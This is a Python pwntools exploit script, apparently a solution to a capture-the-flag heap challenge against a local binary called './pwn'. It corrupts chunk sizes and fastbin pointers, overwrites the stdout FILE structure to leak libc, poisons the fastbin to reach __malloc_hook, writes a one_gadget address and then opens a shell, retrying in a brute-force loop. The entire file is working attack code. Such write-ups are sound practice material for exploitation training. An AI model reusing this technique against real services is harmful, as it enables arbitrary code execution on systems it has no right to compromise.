from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

#io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
sh     = lambda      : io.interactive()
menu   = b'3. Free'

def add(size, idx):
	sla(menu, b'1')
	sla(b'chunk :', byte(size))
	sla(b'index :', byte(idx))

def edit(idx, data):
	sla(menu, b'2')
	sla(b'chunk :', byte(idx))
	sda(b'data :', data)

def dele(idx):
	sla(menu, b'3')
	sla(b'index :', byte(idx))

flag = True
while flag:
	try:
		#flag = False
		io = process("./pwn")
		sla(b'name :', b'XiaozaYa')
		add(0x18, 0) # 0
		add(0x68, 1) # 1	
		add(0x68, 2) # 2
		add(0x68, 3) # 3
		dele(1)
		payload = b'\x00'*0x18 + b'\xe1'
		edit(0, payload)
		dele(1)
		edit(1, b'\xdd\x85')
		payload = b'\x00'*0x18 + b'\x71'
		edit(0, payload)
		add(0x68, 4) # 4
		add(0x68, 5) # 5 --> _IO_2_1_stdout_ - 0x33
		payload = b'\x00'*0x33 + p64(0xfbad1800) + p64(0)*3 + b'\x00'
		edit(5, payload)
		rc(0x88)
		libc.address = addr(6) - 0x3c48e0
		print("\033[31m[libc_base -> "+str(hex(libc.address))+"]\033[0m")
		realloc = libc.sym.realloc
		malloc_hook = libc.sym.__malloc_hook
		dele(1)
		edit(1, p64(malloc_hook-0x23))
		add(0x68, 6) # 6
		add(0x68, 7) # 7 --> malloc_hook - 0x13
		ones = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
		ones = [i+libc.address for i in ones]
		payload = b'\x00'*0xB + p64(ones[1]) + p64(realloc+13)
		edit(7, payload)
		add(0x68, 8)
		#debug()
		sh()
		break
	except Exception as e:
		io.close()
		continue
